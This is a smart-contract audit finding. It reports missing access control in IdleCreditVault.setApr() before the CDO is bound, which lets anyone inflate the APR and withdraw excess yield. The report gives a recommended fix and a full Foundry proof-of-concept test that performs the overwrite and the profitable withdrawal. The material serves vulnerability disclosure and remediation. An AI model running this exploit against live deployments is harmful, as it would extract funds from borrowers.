### Title
Unauthenticated APR overwrite before CDO binding enables excess-yield withdrawal - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary

`IdleCreditVault.setApr()` treats an unset `idleCDO` as a setup mode and skips the caller check entirely. During the deployment window between strategy initialization and `setWhitelistedCDO`, any EOA can overwrite the fixed APR with any value up to `maxApr`. When the CDO is initialized, `_additionalInit()` reads the attacker-controlled `lastApr` and converts it into the epoch’s scaled APR. [1](#0-0) [2](#0-1) 

### Finding Description

`setApr()` only enforces `msg.sender == idleCDO || msg.sender == manager` when `idleCDO != address(0)`. While `idleCDO == address(0)`, the authorization branch is skipped and only the `maxApr` bound remains. [1](#0-0) 

The same issue applies to `setAprsWithBuffer()`, which first writes the attacker-controlled `unscaledApr` and then calls the same permissive setup path. [3](#0-2) 

CDO initialization later calls `_setScaledApr(_getStrategyApr())`, which reads the attacker-written `lastApr` and scales it by `(epochDuration + bufferPeriod) / epochDuration`. With the default 30-day epoch and 5-day buffer, an attacker can set `lastApr` to `17e18`; initialization then stores approximately `19.833e18`, still below the default `20e18` cap. [4](#0-3) [5](#0-4) 

The resulting epoch accounting treats the forged unscaled APR as the legitimate borrower rate, inflating `expectedEpochInterest` and the subsequent tranche value. [6](#0-5) 

### Impact Explanation

An attacker who is also a KYC-passing lender can turn an intended `5e18` APR into `17e18`. For a 30-day epoch plus 5-day buffer, the excess APR is `12e18`, producing approximately `TVL * 0.12 * 35 / 365`, or about `1.15%` of deposited principal, in attacker-claimable yield. On a `100,000` underlying-token position, that is approximately `1,150` underlying tokens extracted from the borrower-funded repayment.

This is a direct breach of the fixed-rate invariant: the borrower and manager expect the initialized APR, but the vault settles using an APR supplied by an unprivileged account. The existing `maxApr` check does not prevent the attack because the forged value can remain below the cap after scaling. [7](#0-6) 

### Likelihood Explanation

Exploitation requires a deployment/configuration window in which the strategy has been initialized but `idleCDO` has not yet been bound. If deployment scripts initialize the strategy, deploy the CDO, and whitelist it in separate transactions, the call is permissionless and deterministic.

The attack additionally requires the honest owner to continue binding the CDO and the honest borrower to fund the inflated obligation. Those dependencies reduce likelihood, but neither participant needs to be malicious, and the forged parameter can remain below `maxApr`, making it less conspicuous than an uncapped value.

### Recommendation

Do not permit public APR mutation while `idleCDO == address(0)`. For example:

```solidity
function setApr(uint256 _apr) public {
  address _cdo = idleCDO;
  address allowed = _cdo == address(0) ? manager : _cdo;
  if (msg.sender != allowed && msg.sender != manager) revert NotAllowed();

  uint256 _maxApr = maxApr;
  if (_maxApr != 0 && _apr > _maxApr) revert NotAllowed();
  lastApr = _apr;
}
```

Preferably, bind the CDO atomically during deployment or require only `manager` to configure APR before binding. The CDO initialization path should also independently validate the resulting scaled APR against `maxApr`.

### Proof of Concept

```solidity
// test/foundry/IdleCreditVaultPreBindApr.t.sol
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {TransparentUpgradeableProxy} from
  "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {IdleCreditVault} from
  "../../contracts/strategies/idle/IdleCreditVault.sol";
import {IdleCDOEpochVariant} from "../../contracts/IdleCDOEpochVariant.sol";
import {IERC20Detailed} from "../../contracts/interfaces/IERC20Detailed.sol";
import {IdleCDOTranche} from "../../contracts/IdleCDOTranche.sol";

contract IdleCreditVaultPreBindAprTest is Test {
  uint256 internal constant ONE_SCALE = 1e6;

  function test_UnprivilegedActorOverwritesFixedAprBeforeCdoBinding() external {
    address owner = makeAddr("owner");
    address manager = makeAddr("manager");
    address borrower = makeAddr("borrower");
    address feeReceiver = makeAddr("feeReceiver");
    address attacker = makeAddr("attacker");

    IERC20Detailed underlying = IERC20Detailed(deployCode("ERC20Mock"));

    IdleCreditVault strategyImpl = new IdleCreditVault();
    bytes memory strategyInit = abi.encodeWithSelector(
      IdleCreditVault.initialize.selector,
      address(underlying),
      owner,
      manager,
      borrower,
      "Borrower",
      5e18
    );
    IdleCreditVault strategy = IdleCreditVault(address(
      new TransparentUpgradeableProxy(
        address(strategyImpl),
        address(this),
        strategyInit
      )
    ));

    // The strategy is initialized, but no CDO has been bound yet. Any EOA can
    // overwrite the configured fixed APR because the authorization check is skipped.
    vm.prank(attacker);
    strategy.setApr(17e18);
    assertEq(strategy.getApr(), 17e18);

    IdleCDOEpochVariant cdoImpl = new IdleCDOEpochVariant();
    bytes memory cdoInit = abi.encodeWithSelector(
      IdleCDOEpochVariant.initialize.selector,
      0,
      address(underlying),
      feeReceiver,
      owner,
      address(0),
      address(strategy),
      10_000
    );
    IdleCDOEpochVariant cdo = IdleCDOEpochVariant(address(
      new TransparentUpgradeableProxy(
        address(cdoImpl),
        address(this),
        cdoInit
      )
    ));

    vm.prank(owner);
    strategy.setWhitelistedCDO(address(cdo));

    // Initialization scaled the attacker-controlled APR by 35 / 30.
    assertEq(strategy.unscaledApr(), 17e18);
    assertEq(strategy.getApr(), 17e18 * 35 / 30);

    uint256 depositAmount = 100_000 * ONE_SCALE;
    deal(address(underlying), attacker, depositAmount);
    vm.startPrank(attacker);
    underlying.approve(address(cdo), depositAmount);
    cdo.depositAA(depositAmount);
    vm.stopPrank();

    vm.prank(manager);
    cdo.startEpoch();

    // Fund the honest borrower for the inflated close-out repayment.
    deal(address(underlying), borrower, type(uint128).max);
    vm.prank(borrower);
    underlying.approve(address(cdo), type(uint256).max);

    vm.warp(cdo.epochEndDate() + 1);
    vm.prank(manager);
    cdo.stopEpoch(0, 1); // close-pool sentinel: recall principal plus accrued interest

    address aaTranche = cdo.AATranche();
    vm.prank(attacker);
    uint256 requested = cdo.requestWithdraw(0, aaTranche);

    uint256 balanceBefore = underlying.balanceOf(attacker);
    vm.prank(attacker);
    cdo.claimWithdrawRequest();
    uint256 received = underlying.balanceOf(attacker) - balanceBefore;

    assertEq(received, requested);
    assertGt(received, depositAmount);
  }
}
```

The decisive assertion is that `strategy.setApr(17e18)` succeeds from `attacker` before CDO binding, despite `attacker` being neither the CDO nor the manager. The subsequent withdrawal realizes more than the attacker’s principal from borrower-funded accrued interest. [1](#0-0)
